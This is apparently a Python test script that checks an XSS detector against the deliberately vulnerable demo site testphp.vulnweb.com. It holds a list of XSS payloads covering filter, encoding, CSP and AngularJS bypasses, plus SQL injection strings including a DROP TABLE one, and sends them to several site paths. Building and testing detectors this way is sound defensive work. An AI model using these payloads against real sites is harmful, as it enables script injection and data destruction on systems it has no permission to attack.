#!/usr/bin/env python3
"""
Test Script for Advanced XSS Detector against ACUART Test Site

This script runs the Advanced XSS Detector against the deliberately
vulnerable http://testphp.vulnweb.com site to demonstrate its
capabilities in detecting real XSS vulnerabilities.
"""

import os
import sys
import logging
import json
import requests
from datetime import datetime
import urllib.parse

# Add the project directory to the path
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

# Import required components
from core_scanner.advanced_xss_detector import AdvancedXSSDetector

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('xss_test')

def fetch_url(url, headers=None, params=None):
    """
    Fetch a URL and return the response.
    
    Args:
        url (str): The URL to fetch
        headers (dict): Optional headers to include
        params (dict): Optional query parameters
        
    Returns:
        dict: Response data including headers, body, and status code
    """
    try:
        headers = headers or {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        response = requests.get(url, headers=headers, params=params, timeout=10)
        
        return {
            'body': response.text,
            'headers': dict(response.headers),
            'status_code': response.status_code,
            'url': response.url
        }
    except Exception as e:
        logger.error(f"Error fetching URL {url}: {str(e)}")
        return {
            'body': '',
            'headers': {},
            'status_code': 0,
            'error': str(e)
        }

def test_url_with_payloads(url, payloads, detector):
    """
    Test a URL with a list of XSS payloads.
    
    Args:
        url (str): The base URL to test
        payloads (list): List of payload strings to try
        detector (AdvancedXSSDetector): The detector instance
        
    Returns:
        dict: Test results
    """
    results = {
        'url': url,
        'timestamp': datetime.now().isoformat(),
        'tests_run': 0,
        'vulnerabilities_found': 0,
        'analysis': []
    }
    
    logger.info(f"Testing URL: {url}")
    
    # First, test the base URL
    base_response = fetch_url(url)
    base_analysis = detector.analyze_response(url, base_response)
    results['base_analysis'] = base_analysis
    
    # Count any vulnerabilities in the base page
    if base_analysis.get('vulnerabilities'):
        results['vulnerabilities_found'] += len(base_analysis['vulnerabilities'])
    
    # Now test with payloads
    for i, payload in enumerate(payloads):
        logger.info(f"Testing payload {i+1}/{len(payloads)}: {payload[:30]}...")
        
        # Create test URL with payload
        test_url = f"{url}?searchFor={urllib.parse.quote(payload)}"
        response = fetch_url(test_url)
        
        # Analyze the response
        analysis = detector.analyze_response(test_url, response)
        
        # Count vulnerabilities
        if analysis.get('vulnerabilities'):
            results['vulnerabilities_found'] += len(analysis['vulnerabilities'])
        
        # Add to results
        results['tests_run'] += 1
        results['analysis'].append({
            'payload': payload,
            'test_url': test_url,
            'status_code': response['status_code'],
            'vulnerabilities': analysis.get('vulnerabilities', []),
            'reflection_points': analysis.get('reflection_points', []),
            'risk_level': analysis.get('risk_level', 'unknown')
        })
    
    return results

def test_specific_paths(base_url, detector):
    """
    Test specific known vulnerable paths on the target site.
    
    Args:
        base_url (str): The base URL of the vulnerable site
        detector (AdvancedXSSDetector): The detector instance
    
    Returns:
        dict: Test results for each path
    """
    vulnerable_paths = [
        "/search.php?test=query",
        "/artists.php?artist=1",
        "/listproducts.php?cat=1",
        "/product.php?pic=1",
        "/comment.php?pid=1",
        "/guestbook.php",
        "/userinfo.php?uid=1"
    ]
    
    all_results = {}
    basic_payload = "<script>alert('XSS')</script>"
    
    for path in vulnerable_paths:
        url = f"{base_url}{path}"
        logger.info(f"Testing vulnerable path: {url}")
        
        # First test the path as-is
        response = fetch_url(url)
        analysis = detector.analyze_response(url, response)
        
        # Then test with payload appended
        if "?" in path:
            payload_url = f"{base_url}{path}&xss={urllib.parse.quote(basic_payload)}"
        else:
            payload_url = f"{base_url}{path}?xss={urllib.parse.quote(basic_payload)}"
        
        payload_response = fetch_url(payload_url)
        payload_analysis = detector.analyze_response(payload_url, payload_response)
        
        all_results[path] = {
            'base_analysis': analysis,
            'payload_analysis': payload_analysis
        }
    
    return all_results

def main():
    """Main function to run the test."""
    # Initialize the detector
    config = {
        'max_detection_depth': 3,
        'enable_machine_learning': False,
        'detection_timeout': 60,
        'analyze_dom': True
    }
    detector = AdvancedXSSDetector(config)
    
    # Target vulnerable URL
    target_url = "http://testphp.vulnweb.com"
    
    # Define manual payloads for testing - comprehensive collection of XSS vectors
    manual_payloads = [
        # Basic payloads
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        
        # SQL Injection combined with XSS
        "' OR 1=1; <script>alert('XSS')</script>",
        "1'; DROP TABLE users; <script>alert('XSS')</script>--",
        
        # JavaScript string termination attacks
        "';alert('XSS');//",
        "\";alert('XSS');//",
        
        # DOM-based payloads
        "<script>document.write('<img src=\"x\" onerror=\"alert(\'XSS\')\">')</script>",
        "<script>eval(location.hash.slice(1))</script>#alert('XSS')",
        
        # HTML5 vectors
        "<iframe src='javascript:alert(1)'></iframe>",
        "<video><source onerror=\"javascript:alert('XSS')\">",
        "<audio src=x onerror=alert('XSS')>",
        
        # Event handlers
        "<body onload=alert('XSS')>",
        "<input autofocus onfocus=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        
        # Exotic vectors
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('XSS')>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')\">",
        
        # Encoding bypasses
        "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;",
        "<script>\\u0061lert('XSS')</script>",
        
        # Filter bypass techniques
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<script>a=alert;a('XSS');</script>",
        
        # CSP bypass attempts
        "<script nonce=abc>alert('XSS')</script>",
        "<script src=\"data:text/javascript,alert('XSS')\"></script>",
        
        # AngularJS vectors (common in modern web apps)
        "{{constructor.constructor('alert(\"XSS\")')()}}",
        "<div ng-app ng-csp>{{$eval.constructor('alert(\"XSS\")')()}}</div>"
    ]
    
    # Use manual payloads for testing
    payloads = manual_payloads
    
    # Run the test with payloads
    results = test_url_with_payloads(target_url, payloads, detector)
    
    # Test specific vulnerable paths
    path_results = test_specific_paths(target_url, detector)
    results['vulnerable_paths'] = path_results
    
    # Output the results
    print("\n\n==== TEST RESULTS ====")
    print(f"Target URL: {results['url']}")
    print(f"Tests Run: {results['tests_run']}")
    print(f"Potential Vulnerabilities Found: {results['vulnerabilities_found']}")
    print(f"Risk Level: {results.get('base_analysis', {}).get('risk_level', 'unknown')}")
    
    # Print vulnerability details if found
    if results['vulnerabilities_found'] > 0:
        print("\n==== VULNERABILITIES ====")
        for i, test in enumerate(results['analysis']):
            if test['vulnerabilities']:
                print(f"\nTest {i+1}: {test['test_url']}")
                print(f"Risk Level: {test['risk_level']}")
                for vuln in test['vulnerabilities']:
                    print(f"  - Type: {vuln.get('type')}")
                    print(f"    Description: {vuln.get('description')}")
                    print(f"    Risk Level: {vuln.get('risk_level')}")
    
    # Print path vulnerability results
    print("\n==== VULNERABLE PATHS ANALYSIS ====")
    for path, path_result in path_results.items():
        print(f"\nPath: {path}")
        print(f"Base Risk Level: {path_result['base_analysis'].get('risk_level', 'unknown')}")
        print(f"Payload Risk Level: {path_result['payload_analysis'].get('risk_level', 'unknown')}")
        
        base_vulns = path_result['base_analysis'].get('vulnerabilities', [])
        payload_vulns = path_result['payload_analysis'].get('vulnerabilities', [])
        
        if base_vulns:
            print(f"Base Vulnerabilities: {len(base_vulns)}")
            for vuln in base_vulns:
                print(f"  - {vuln.get('type')}: {vuln.get('description')}")
        
        if payload_vulns:
            print(f"Payload Vulnerabilities: {len(payload_vulns)}")
            for vuln in payload_vulns:
                print(f"  - {vuln.get('type')}: {vuln.get('description')}")
    
    # Print recommendations
    if 'recommendation' in results.get('base_analysis', {}):
        print("\n==== RECOMMENDATIONS ====")
        print(results['base_analysis']['recommendation'])
    
    # Save detailed results to file
    with open('vulnweb_test_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\nDetailed results saved to vulnweb_test_results.json")

if __name__ == "__main__":
    main()
